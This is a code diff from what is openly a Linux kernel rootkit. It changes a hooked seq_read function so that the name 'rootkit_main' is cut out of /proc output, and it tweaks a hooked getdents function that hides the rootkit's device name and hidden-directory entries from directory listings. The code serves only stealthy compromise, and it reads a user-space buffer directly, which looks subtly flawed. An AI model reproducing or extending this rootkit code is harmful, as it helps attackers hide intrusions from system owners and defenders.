@@ -14,8 +14,17 @@ struct linux_dirent {
 
 ssize_t seq_read_fake(struct file *file, char __user *buf, size_t size, loff_t *ppos) 
 {
-	printk("Successful hook into seqread\n");
-	return orig_proc_read(file, buf, size, ppos);
+	//delete rootkit name from entries
+	ssize_t rval = orig_proc_read(file, buf, size, ppos);
+	printk("Ret val: %ld\n", rval);
+	char *p;
+	if ((p=strstr(buf, "rootkit_main")) != NULL) {
+		printk("Found rootkit in buffer...Removing:)\n");
+		memmove(p,p + strlen("rootkit_main"), strlen(p + strlen("rootkit_main")) + 1);
+		return rval - strlen("rootkit_main");
+	}
+	//printk("Buf Val: %s\n", buf);
+	return rval;
 }
 
 //Test fakeRead
@@ -35,7 +44,7 @@ static asmlinkage int fakegetdents(int fd, struct linux_dirent __user *dirp, uns
 		entry = (struct linux_dirent *)(dentBuf + iterEnts); //get each entry
 		
 		//we will hide '.' files and rtkt name files
-		if((strcmp(entry->d_name, DEVICE_NAME) == 0) ||
+		if(strcmp(entry->d_name, DEVICE_NAME) == 0 ||
 			strstr(entry->d_name, HIDDEN_DIR) != NULL) {
 			memcpy(dentBuf + iterEnts, dentBuf + iterEnts + entry->d_reclen, ret - (iterEnts + entry->d_reclen)); //copy non hidden files forwards
 			ret-= entry->d_reclen;
